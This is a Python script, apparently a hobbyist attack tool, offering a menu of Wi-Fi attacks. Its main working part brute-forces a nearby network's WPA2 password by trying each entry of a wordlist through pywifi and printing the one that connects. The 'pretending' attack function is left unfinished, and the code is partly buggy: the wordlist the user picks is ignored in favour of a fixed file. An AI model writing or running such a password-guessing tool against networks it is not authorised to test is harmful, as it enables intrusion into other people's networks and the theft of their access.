from socket import *
import pywifi
from time import sleep
from os import system
import ipaddress

system('clear')

def print_dashboard():
    dashboard = ''' 
    [ 1 ] WIFI-Bruteforce attack
    [ 2 ] WIFI-Pretending attack
    [ 3 ] List devices who connected to the wifi
    '''
    print(dashboard)

def connect(ssid,iface,auth='LOCK',password=''):
    device = pywifi.Profile()
    device.ssid = ssid 
    device.auth = pywifi.const.AUTH_ALG_OPEN
    device.akm.clear()

    if auth == 'LOCK':
        device.key = password.strip('\n')
        device.akm.append(pywifi.const.AKM_TYPE_WPA2PSK)
        device.cipher = pywifi.const.CIPHER_TYPE_CCMP

    else:
        device.akm.append(pywifi.const.AKM_TYPE_NONE)
        device.cipher = pywifi.const.CIPHER_TYPE_NONE

    iface.remove_all_network_profiles()
    tmp_profile = iface.add_network_profile(device)
    iface.connect(tmp_profile)
    sleep(7)
    if iface.status() == pywifi.const.IFACE_CONNECTED:
        return True
    return False

def launch_bruteforce(ssid,path,iface,auth):
    with open(path,'r') as wordlist:
        passes = wordlist.readlines()
        for bf in passes:
            if connect(ssid,iface,auth,bf):
                return bf
    wordlist.close()
    return None

def wifi_bruteforce():
    availables = []
    init = pywifi.PyWiFi()
    interface = init.interfaces()[0]
    
    interface.scan()
    sleep(2)
    networks = interface.scan_results()

    if len(networks) == 0:
        print("No device found")
        return

    for network in networks:
        availables.append((network.ssid,'OPEN' if len(network.akm) == 0 else 'LOCK'))
        signal_strength = f"Good signal({network.signal})" if -network.signal > 50 and -network.signal <= 70 else f"Poor signal({network.signal})"
        print(f'Network name : {network.ssid}\nNetwork MAC(BSSID) : {network.bssid}\nNetwork signal : {signal_strength}\nAuthentication : {'No password' if len(network.akm) == 0 else 'Locked'}'.strip())
        print()

    while True:
        target = input('Enter the target wifi name : ').strip()
        selected_auth = None
        for name, auth in availables:
            if target == name:
                selected_auth = auth
                break

        if selected_auth == 'OPEN':
            if connect(target,interface,selected_auth):
                print(f'target \'{name}\' is connected successfully!')
            else:
                print(f'target \'{name}\' is connected failed!')

        if not selected_auth:
            system('clear')
            print(f'Invalid wifi name : {target}')
            continue
        
        elif selected_auth == 'LOCK':
            system('clear')
            print('Wordlist type:\n')
            print('1.Numbers\n2.Alphabates(including all language)\n3.Combo(Like username)\n4.Custom wordlist'.strip())
            wordlist_type = int(input('Enter wordlist type : '))
            path = None
            if wordlist_type == 1:
                path = 'wordlist/numbers.txt'
            elif wordlist_type == 2:
                path = 'wordlist/alphabets.txt'
            elif wordlist_type == 3:
                path = 'wordlist/combo.txt'
            elif wordlist_type == 4:
                pass
            password = launch_bruteforce(target,'wordlist/alphabets.txt',interface,selected_auth)
            if password == None:
                print('password is not in wordlist')
            else:
                system('clear')
                print(f'SSID : {name}\npassword found : {password}')
                break

def pretending_wifi():
    wifi_info = dict()
    init = pywifi.PyWiFi()
    interface = init.interfaces()[0]
    status = interface.status()

    sock = socket(AF_INET,SOCK_DGRAM)
    sock.connect(('8.8.8.8',80))
    getip = sock.getsockname()[0]

    if status == pywifi.const.IFACE_CONNECTED:
        profile = interface.network_profiles()
        for _profile in profile:
            wifi_info.update({'SSID':_profile.ssid,'IP':getip})

    ip_init = ipaddress.ip_network(getip,strict=False)

pretending_wifi()
            